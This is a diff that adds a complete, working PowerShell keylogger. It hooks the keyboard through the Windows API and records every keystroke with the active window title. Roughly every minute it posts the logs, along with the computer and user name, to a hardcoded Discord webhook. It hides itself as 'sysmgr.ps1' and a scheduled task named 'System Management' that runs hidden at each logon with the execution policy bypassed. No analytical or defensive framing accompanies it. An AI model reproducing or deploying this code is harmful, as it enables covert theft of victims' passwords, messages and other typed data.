@@ -1,0 +1,203 @@
+$webhookUrl = "https://discord.com/api/webhooks/1370769053525868636/K7tsBhS0bi0S9Y-TusKDpF1dbmE0PUPbYgn0FG0Yu1qAzOxTmx6yuIiyUsCMGroal1ib"
+$dataPath = "$env:TEMP\sysdata.json"
+$deviceId = "DIGISK01"
+
+if (!(Test-Path $dataPath)) {
+    Set-Content -Path $dataPath -Value "{`"device`":`"$deviceId`",`"logs`":[]}" -Force
+}
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$APIsignatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+[DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+'@
+
+Add-Type -MemberDefinition $APIsignatures -Name WinAPI -Namespace KeyLogger
+
+
+$WH_KEYBOARD_LL = 13
+
+
+$keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
+    param($nCode, $wParam, $lParam)
+    
+    if ($nCode -ge 0) {
+        $vkCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
+        $keyState = [System.Windows.Forms.Keys]$vkCode
+        $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+        
+        # Get window title
+        try {
+            $activeWindow = (Get-Process -id (Get-Process -id $pid).SessionId).MainWindowTitle
+            if ([string]::IsNullOrEmpty($activeWindow)) { $activeWindow = "Unknown" }
+        } catch {
+            $activeWindow = "Unknown"
+        }
+        
+        # Create key info
+        $keyDetails = @{
+            'timestamp' = $timestamp
+            'key' = $keyState.ToString()
+            'window' = $activeWindow
+        }
+        
+        # Load JSON and update it
+        try {
+            $jsonData = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
+            $jsonData.logs += $keyDetails
+            $jsonData | ConvertTo-Json -Depth 3 -Compress | Set-Content -Path $dataPath -Force
+        } catch {
+            # If error, try to recreate the JSON file
+            Set-Content -Path $dataPath -Value "{`"device`":`"$deviceId`",`"logs`":[]}" -Force
+        }
+    }
+    
+    return [KeyLogger.WinAPI]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
+}
+
+$hookId = [KeyLogger.WinAPI]::SetWindowsHookEx($WH_KEYBOARD_LL, $keyboardHookDelegate, [KeyLogger.WinAPI]::GetModuleHandle($null), 0)
+
+function Test-Internet {
+    try {
+        $response = Invoke-WebRequest -Uri 'https://www.google.com' -UseBasicParsing -TimeoutSec 3
+        return ($response.StatusCode -eq 200)
+    } catch {
+        return $false
+    }
+}
+
+function Send-Data {
+    if (!(Test-Path $dataPath)) { return }
+    if (!(Test-Internet)) { return }
+    
+    $jsonData = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
+    
+    if ($jsonData.logs.Count -eq 0) { return }
+    
+    $computerName = $env:COMPUTERNAME
+    $userName = $env:USERNAME
+    
+    # Create webhook payload
+    $payload = @{
+        'username' = 'KeyLogger'
+        'content' = "Keylog data from $computerName / $userName"
+        'embeds' = @(
+            @{
+                'title' = "Device $($jsonData.device) Log"
+                'color' = 5814783
+                'fields' = @(
+                    @{
+                        'name' = 'Computer'
+                        'value' = $computerName
+                        'inline' = $true
+                    },
+                    @{
+                        'name' = 'User'
+                        'value' = $userName
+                        'inline' = $true
+                    },
+                    @{
+                        'name' = 'Log Count'
+                        'value' = $jsonData.logs.Count
+                        'inline' = $true
+                    }
+                )
+            }
+        )
+    }
+    
+    $payloadJson = $payload | ConvertTo-Json -Depth 4
+    
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+        
+        # Send the actual data in chunks (Discord has message size limits)
+        $chunks = [Math]::Ceiling($jsonData.logs.Count / 25)
+        
+        for ($i = 0; $i -lt $chunks; $i++) {
+            $start = $i * 25
+            $end = [Math]::Min(($i + 1) * 25 - 1, $jsonData.logs.Count - 1)
+            $chunkData = @{
+                'content' = "Log data part $($i+1)/$chunks"
+                'embeds' = @(
+                    @{
+                        'title' = "Keylog Data"
+                        'description' = ($jsonData.logs[$start..$end] | ConvertTo-Json -Compress)
+                    }
+                )
+            }
+            
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body ($chunkData | ConvertTo-Json -Depth 4)
+            Start-Sleep -Seconds 1
+        }
+        
+        # Clear logs after successful send
+        $jsonData.logs = @()
+        $jsonData | ConvertTo-Json -Depth 3 | Set-Content -Path $dataPath -Force
+    } catch {
+        # If failed, we'll try again next time
+    }
+}
+
+function Setup-Persistence {
+    # Create a copy of this script
+    $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Definition -Raw
+    $scriptPath = "$env:TEMP\sysmgr.ps1"
+    Set-Content -Path $scriptPath -Value $scriptContent -Force
+    
+    # Create scheduled task
+    $taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $taskTrigger = New-ScheduledTaskTrigger -AtLogon
+    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
+    $taskName = "System Management"
+    
+    # Register the task
+    try {
+        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        if (!$existingTask) {
+            $task = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings
+            Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
+        }
+    } catch {
+        # Silently continue if we don't have permission
+    }
+}
+
+# Setup persistence
+Setup-Persistence
+
+# Create a timer to check for connection and send data
+$timer = New-Object System.Timers.Timer
+$timer.Interval = 60000  # Check every minute
+$timer.AutoReset = $true
+$timer.Enabled = $true
+
+# Register event for timer
+Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action {
+    Send-Data
+}
+
+# Keep script running
+try {
+    while ($true) {
+        Start-Sleep -Seconds 60
+    }
+} finally {
+    # Cleanup if script is stopped
+    if ($hookId -ne [IntPtr]::Zero) {
+        [KeyLogger.WinAPI]::UnhookWindowsHookEx($hookId)
+    }
+}
